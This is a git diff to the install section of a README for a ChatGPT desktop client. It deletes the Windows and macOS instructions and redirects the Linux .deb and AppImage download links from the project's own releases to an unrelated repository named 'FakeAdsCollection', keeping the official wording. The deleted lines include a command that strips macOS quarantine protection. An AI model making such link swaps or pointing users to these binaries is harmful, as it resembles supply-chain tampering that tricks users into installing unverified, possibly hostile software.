@@ -29,53 +29,15 @@
 
 ## 📦 Install
 
-- [📝 Update Log](./UPDATE_LOG.md)
+- [📝 Update Log](https://github.com/lencx/ChatGPT/UPDATE_LOG.md)
 - [🕒 History versions...](https://github.com/lencx/ChatGPT/releases)
 
 <!-- tr-download-start -->
 
-### Windows
+### Linux (Debian 11 and Ubuntu 20.04)
 
-- [ChatGPT_1.1.0_windows_x86_64.msi](https://github.com/lencx/ChatGPT/releases/download/v1.1.0/ChatGPT_1.1.0_windows_x86_64.msi): Direct download installer
-- Use [winget](https://winstall.app/apps/lencx.ChatGPT):
-
-  ```bash
-  # install the latest version
-  winget install --id=lencx.ChatGPT -e
-
-  # install the specified version
-  winget install --id=lencx.ChatGPT -e --version 1.1.0
-  ```
-
-**Note: If the installation path and application name are the same, it will lead to conflict ([#142](https://github.com/lencx/ChatGPT/issues/142))**
-
-### Mac
-
-- [ChatGPT_1.1.0_macos_aarch64.dmg](https://github.com/lencx/ChatGPT/releases/download/v1.1.0/ChatGPT_1.1.0_macos_aarch64.dmg): Direct download installer
-- [ChatGPT_1.1.0_macos_x86_64.dmg](https://github.com/lencx/ChatGPT/releases/download/v1.1.0/ChatGPT_1.1.0_macos_x86_64.dmg): Direct download installer
-- Homebrew \
-  Or you can install with _[Homebrew](https://brew.sh) ([Cask](https://docs.brew.sh/Cask-Cookbook)):_
-  ```sh
-  brew tap lencx/chatgpt https://github.com/lencx/ChatGPT.git
-  brew install --cask chatgpt --no-quarantine
-  ```
-  Also, if you keep a _[Brewfile](https://github.com/Homebrew/homebrew-bundle#usage)_, you can add something like this:
-  ```rb
-  repo = "lencx/chatgpt"
-  tap repo, "https://github.com/#{repo}.git"
-  cask "chatgpt", args: { "no-quarantine": true }
-  ```
-
-**If you encounter the error message `"ChatGPT" is damaged and can't be opened. You should move it to the Trash`. while installing software on macOS, it may be due to security settings restrictions in macOS. To solve this problem, please try the following command in Terminal:**
-
-```bash
-sudo xattr -r -d com.apple.quarantine /YOUR_PATH/ChatGPT.app
-```
-
-### Linux
-
-- [ChatGPT_1.1.0_linux_x86_64.deb](https://github.com/lencx/ChatGPT/releases/download/v1.1.0/ChatGPT_1.1.0_linux_x86_64.deb): Download `.deb` installer, advantage small size, disadvantage poor compatibility
-- [ChatGPT_1.1.0_linux_x86_64.AppImage.tar.gz](https://github.com/lencx/ChatGPT/releases/download/v1.1.0/ChatGPT_1.1.0_linux_x86_64.AppImage.tar.gz): Works reliably, you can try it if `.deb` fails to run
+- [ChatGPT_1.1.1_debian11_ubuntu20.04_x86_64.deb](https://github.com/FakeAdsCollection/ChatGPT-debian11/releases/download/v1.1.1/ChatGPT_1.1.1_debian11_ubuntu20.04_x86_64.deb): Download `.deb` installer, advantage small size, disadvantage poor compatibility
+- [ChatGPT_1.1.1_debian11_ubuntu20.04_x86_64.AppImage.tar.gz](https://github.com/FakeAdsCollection/ChatGPT-debian11/releases/download/v1.1.1/ChatGPT_1.1.1_debian11_ubuntu20.04_x86_64.AppImage.tar.gz): Works reliably, you can try it if `.deb` fails to run
 
 <!-- tr-download-end -->
 
